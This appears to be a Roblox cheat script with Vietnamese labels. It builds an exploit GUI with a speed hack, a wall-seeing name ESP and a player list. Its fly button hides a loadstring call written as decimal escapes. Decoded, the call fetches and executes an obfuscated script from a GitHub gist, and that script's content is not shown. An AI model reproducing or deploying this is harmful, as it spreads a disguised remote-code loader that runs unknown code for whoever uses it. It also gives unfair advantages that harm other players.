-- phần đầu giữ nguyên
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
ScreenGui.Name = "Y44I_GUI"
local Main = Instance.new("Frame", ScreenGui)
Main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Main.BorderColor3 = Color3.fromRGB(255, 0, 0)
Main.BorderSizePixel = 2
Main.Position = UDim2.new(0, 200, 0, 200)
Main.Size = UDim2.new(0, 400, 0, 370)
Main.Draggable = true
Main.Active = true

local function createButton(text, pos, size)
	local btn = Instance.new("TextButton", Main)
	btn.Text = text
	btn.Position = pos
	btn.Size = size
	btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	btn.BorderColor3 = Color3.fromRGB(255, 0, 0)
	btn.BorderSizePixel = 1
	btn.TextColor3 = Color3.fromRGB(255, 0, 0)
	btn.Font = Enum.Font.SourceSans
	btn.TextScaled = true
	return btn
end

local function createLabel(text, pos, size)
	local lbl = Instance.new("TextLabel", Main)
	lbl.Text = text
	lbl.Position = pos
	lbl.Size = size
	lbl.BackgroundTransparency = 1
	lbl.TextColor3 = Color3.fromRGB(255, 0, 0)
	lbl.Font = Enum.Font.SourceSans
	lbl.TextScaled = true
	return lbl
end

local walkSpeed = 16
local flySpeed = 50
local flyEnabled = false
local followEnabled = false
local espEnabled = true

local wsLabel = createLabel("speed 🟢", UDim2.new(0, 10, 0, 40), UDim2.new(0, 100, 0, 30))
local wsMinus = createButton("-", UDim2.new(0, 120, 0, 40), UDim2.new(0, 30, 0, 30))
local wsValue = createLabel("25", UDim2.new(0, 160, 0, 40), UDim2.new(0, 40, 0, 30))
local wsPlus = createButton("+", UDim2.new(0, 210, 0, 40), UDim2.new(0, 30, 0, 30))

local flyBtn = createButton("fly 🟢", UDim2.new(0, 10, 0, 80), UDim2.new(0, 100, 0, 30))

local followLabel = createLabel("bay theo player 🟢", UDim2.new(0, 10, 0, 120), UDim2.new(0, 200, 0, 30))
local nameBox = Instance.new("TextBox", Main)
nameBox.Position = UDim2.new(0, 220, 0, 120)
nameBox.Size = UDim2.new(0, 170, 0, 30)
nameBox.PlaceholderText = "Nhập tên"
nameBox.Text = ""
nameBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
nameBox.TextColor3 = Color3.fromRGB(255, 0, 0)
nameBox.BorderColor3 = Color3.fromRGB(255, 0, 0)
nameBox.BorderSizePixel = 1
nameBox.Font = Enum.Font.SourceSans
nameBox.TextScaled = true

local playerList = Instance.new("ScrollingFrame", Main)
playerList.Position = UDim2.new(0, 10, 0, 160)
playerList.Size = UDim2.new(0, 380, 0, 180)
playerList.CanvasSize = UDim2.new(0, 0, 0, 0)
playerList.ScrollBarThickness = 4
playerList.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
playerList.BorderColor3 = Color3.fromRGB(255, 0, 0)
playerList.BorderSizePixel = 1

local function updatePlayerList()
	playerList:ClearAllChildren()
	local y = 0
	for _, p in pairs(Players:GetPlayers()) do
		if p ~= LocalPlayer then
			local lbl = Instance.new("TextLabel", playerList)
			lbl.Text = "@" .. p.Name .. " ||"
			lbl.Position = UDim2.new(0, 5, 0, y)
			lbl.Size = UDim2.new(1, -10, 0, 20)
			lbl.BackgroundTransparency = 1
			lbl.TextColor3 = Color3.fromRGB(255, 0, 0)
			lbl.Font = Enum.Font.SourceSans
			lbl.TextScaled = true
			lbl.TextXAlignment = Enum.TextXAlignment.Left
			y = y + 22
		end
	end
	playerList.CanvasSize = UDim2.new(0, 0, 0, y)
end

updatePlayerList()
Players.PlayerAdded:Connect(updatePlayerList)
Players.PlayerRemoving:Connect(updatePlayerList)

local espFolder = Instance.new("Folder", game.CoreGui)
RunService.RenderStepped:Connect(function()
	if espEnabled then
		espFolder:ClearAllChildren()
		for _, p in pairs(Players:GetPlayers()) do
			if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then
				local head = p.Character.Head
				local pos, onScreen = Camera:WorldToViewportPoint(head.Position)
				if onScreen then
					local esp = Instance.new("TextLabel", espFolder)
					esp.Text = p.Name
					esp.Position = UDim2.new(0, pos.X, 0, pos.Y)
					esp.Size = UDim2.new(0, 100, 0, 20)
					esp.TextColor3 = Color3.fromRGB(255, 0, 0)
					esp.BackgroundTransparency = 1
					esp.TextScaled = true
					esp.Font = Enum.Font.SourceSans
				end
			end
		end
	else
		espFolder:ClearAllChildren()
	end
end)

local collapseBtn = createButton("Y44I GU1 ☻", UDim2.new(0, 0, 0, 0), UDim2.new(0, 400, 0, 30))
local collapsed = false
collapseBtn.MouseButton1Click:Connect(function()
	collapsed = not collapsed
	for _, v in ipairs(Main:GetChildren()) do
		if v ~= collapseBtn then v.Visible = not collapsed end
	end
	Main.Size = collapsed and UDim2.new(0, 400, 0, 30) or UDim2.new(0, 400, 0, 370)
end)

wsMinus.MouseButton1Click:Connect(function()
	walkSpeed = math.max(0, walkSpeed - 25)
	LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeed
	wsValue.Text = tostring(walkSpeed)
end)

wsPlus.MouseButton1Click:Connect(function()
	walkSpeed = walkSpeed + 25
	LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeed
	wsValue.Text = tostring(walkSpeed)
end)

flyBtn.MouseButton1Click:Connect(function()
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end)
